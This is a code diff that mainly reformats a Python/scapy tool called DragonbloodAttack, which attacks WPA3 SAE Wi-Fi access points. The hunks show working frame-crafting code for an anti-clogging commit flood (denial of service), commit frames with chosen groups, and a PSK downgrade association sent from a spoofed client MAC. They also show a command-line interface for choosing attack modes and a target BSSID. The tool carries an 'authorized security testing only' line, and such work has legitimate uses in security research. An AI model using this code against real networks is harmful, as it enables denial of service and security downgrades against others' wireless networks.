@@ -76,12 +76,16 @@ class DragonbloodAttack:
     token DoS behaviour.
     """
 
-    def __init__(self, interface: str, target_bssid: str,
-                 channel: Optional[int] = None,
-                 attack_mode: str = "downgrade",
-                 timeout: int = 120,
-                 output_dir: str = "captures",
-                 client_mac: Optional[str] = None) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_bssid: str,
+        channel: Optional[int] = None,
+        attack_mode: str = "downgrade",
+        timeout: int = 120,
+        output_dir: str = "captures",
+        client_mac: Optional[str] = None,
+    ) -> None:
         self.interface: str = interface
         self.target_bssid: str = target_bssid.upper()
         self.channel: Optional[int] = channel
@@ -152,13 +156,13 @@ class DragonbloodAttack:
             akms.append(AKM_PSK)
 
         body = (
-            b"\x01\x00"            # RSN version 1
-            + CIPHER_CCMP           # group cipher: CCMP
+            b"\x01\x00"  # RSN version 1
+            + CIPHER_CCMP  # group cipher: CCMP
             + struct.pack("<H", 1)  # pairwise cipher count: 1
-            + CIPHER_CCMP           # pairwise cipher: CCMP
+            + CIPHER_CCMP  # pairwise cipher: CCMP
             + struct.pack("<H", len(akms))  # AKM suite count
             + b"".join(akms)
-            + b"\x00\x00"          # RSN capabilities
+            + b"\x00\x00"  # RSN capabilities
         )
         return body
 
@@ -207,20 +211,26 @@ class DragonbloodAttack:
             commit_body = self._build_sae_commit(MANDATORY_GROUP, b"\x00" * 32, b"\x00" * 64)
             frame = (
                 RadioTap()
-                / Dot11(addr1=self.target_bssid, addr2=client,
-                        addr3=self.target_bssid, type=0, subtype=11)
-                / Dot11Auth(algo=AUTH_ALGO_SAE, seqnum=SAE_AUTH_SEQ_COMMIT,
-                            status=ANTI_CLOGGING_TOKEN_REQUIRED)
+                / Dot11(
+                    addr1=self.target_bssid,
+                    addr2=client,
+                    addr3=self.target_bssid,
+                    type=0,
+                    subtype=11,
+                )
+                / Dot11Auth(
+                    algo=AUTH_ALGO_SAE,
+                    seqnum=SAE_AUTH_SEQ_COMMIT,
+                    status=ANTI_CLOGGING_TOKEN_REQUIRED,
+                )
                 / Raw(load=commit_body)
             )
             try:
                 sendp(frame, iface=self.interface, verbose=False)
             except Exception as e:
-                self.logger.warning("Error sending clogging flood frame %d/%d: %s",
-                                     i + 1, count, e)
+                self.logger.warning("Error sending clogging flood frame %d/%d: %s", i + 1, count, e)
 
-        self.logger.info("Sent %d anti-clogging token flood frames to %s",
-                          count, self.target_bssid)
+        self.logger.info("Sent %d anti-clogging token flood frames to %s", count, self.target_bssid)
 
     def _extract_auth_status(self, packet) -> Optional[int]:
         """Extract the status code from a Dot11Auth packet, if present."""
@@ -252,8 +262,13 @@ class DragonbloodAttack:
             commit_body = self._build_sae_commit(group_id, b"\x11" * 32, b"\x22" * 64)
             frame = (
                 RadioTap()
-                / Dot11(addr1=self.target_bssid, addr2=client,
-                        addr3=self.target_bssid, type=0, subtype=11)
+                / Dot11(
+                    addr1=self.target_bssid,
+                    addr2=client,
+                    addr3=self.target_bssid,
+                    type=0,
+                    subtype=11,
+                )
                 / Dot11Auth(algo=AUTH_ALGO_SAE, seqnum=SAE_AUTH_SEQ_COMMIT, status=0)
                 / Raw(load=commit_body)
             )
@@ -297,8 +312,13 @@ class DragonbloodAttack:
             commit_body = self._build_sae_commit(group_id, b"\x33" * 32, b"\x44" * 64)
             frame = (
                 RadioTap()
-                / Dot11(addr1=self.target_bssid, addr2=client,
-                        addr3=self.target_bssid, type=0, subtype=11)
+                / Dot11(
+                    addr1=self.target_bssid,
+                    addr2=client,
+                    addr3=self.target_bssid,
+                    type=0,
+                    subtype=11,
+                )
                 / Dot11Auth(algo=AUTH_ALGO_SAE, seqnum=SAE_AUTH_SEQ_COMMIT, status=0)
                 / Raw(load=commit_body)
             )
@@ -331,8 +351,13 @@ class DragonbloodAttack:
         try:
             auth_frame = (
                 RadioTap()
-                / Dot11(addr1=self.target_bssid, addr2=client,
-                        addr3=self.target_bssid, type=0, subtype=11)
+                / Dot11(
+                    addr1=self.target_bssid,
+                    addr2=client,
+                    addr3=self.target_bssid,
+                    type=0,
+                    subtype=11,
+                )
                 / Dot11Auth(algo=AUTH_ALGO_OPEN, seqnum=1, status=0)
             )
             sendp(auth_frame, iface=self.interface, verbose=False)
@@ -341,8 +366,13 @@ class DragonbloodAttack:
             rsn_ie = self._build_rsn_ie(include_psk=True, include_sae=False)
             assoc_frame = (
                 RadioTap()
-                / Dot11(addr1=self.target_bssid, addr2=client,
-                        addr3=self.target_bssid, type=0, subtype=0)
+                / Dot11(
+                    addr1=self.target_bssid,
+                    addr2=client,
+                    addr3=self.target_bssid,
+                    type=0,
+                    subtype=0,
+                )
                 / Dot11Elt(ID=0, info=b"")
                 / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
                 / Dot11Elt(ID=48, info=rsn_ie)
@@ -404,7 +434,9 @@ class DragonbloodAttack:
             self.captured_sae_frames.append(frame_info)
         self.logger.info(
             "Captured SAE Authentication frame from %s (seq=%s, status=%s)",
-            src_mac or "unknown", frame_info["seqnum"], frame_info["status"],
+            src_mac or "unknown",
+            frame_info["seqnum"],
+            frame_info["status"],
         )
 
     # -----------------------------------------------------------------
@@ -417,8 +449,9 @@ class DragonbloodAttack:
         Returns:
             Dict with the attack mode, target, and mode-specific data.
         """
-        self.logger.info("Starting Dragonblood attack (mode=%s) against %s",
-                          self.attack_mode, self.target_bssid)
+        self.logger.info(
+            "Starting Dragonblood attack (mode=%s) against %s", self.attack_mode, self.target_bssid
+        )
         self._running = True
         self._start_time = time.time()
 
@@ -523,23 +556,29 @@ For authorized security testing only.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Wireless interface in monitor mode")
-    parser.add_argument("-b", "--bssid", required=True,
-                        help="Target AP BSSID")
-    parser.add_argument("-ch", "--channel", type=int, default=None,
-                        help="Channel to operate on")
-    parser.add_argument("-m", "--mode", default="downgrade",
-                        choices=list(ATTACK_MODES),
-                        help="Attack mode (default: downgrade)")
-    parser.add_argument("-t", "--timeout", type=int, default=120,
-                        help="Timeout in seconds (default: 120)")
-    parser.add_argument("--client-mac", default=None,
-                        help="Spoofed client MAC address")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory for results (default: captures)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument(
+        "-i", "--interface", required=True, help="Wireless interface in monitor mode"
+    )
+    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID")
+    parser.add_argument("-ch", "--channel", type=int, default=None, help="Channel to operate on")
+    parser.add_argument(
+        "-m",
+        "--mode",
+        default="downgrade",
+        choices=list(ATTACK_MODES),
+        help="Attack mode (default: downgrade)",
+    )
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=120, help="Timeout in seconds (default: 120)"
+    )
+    parser.add_argument("--client-mac", default=None, help="Spoofed client MAC address")
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Output directory for results (default: captures)",
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
